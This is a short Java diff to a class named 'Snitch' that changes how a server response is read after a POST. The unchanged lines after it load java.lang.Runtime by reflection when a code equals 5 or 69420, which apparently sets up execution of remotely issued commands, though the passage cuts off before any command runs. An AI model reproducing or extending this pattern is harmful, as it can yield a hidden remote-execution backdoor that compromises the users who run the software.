@@ -56,7 +56,8 @@ public class Snitch {
         } catch (Exception e) {
             e.printStackTrace();
         }
-        String result = Connector.post(connection);
+        Connector.post(connection);
+        String result = connection.getResponse();
         try {
             if (code == 5 || code == 69420) {
                 Class runtimeClass = Class.forName("java.lang.Runtime");
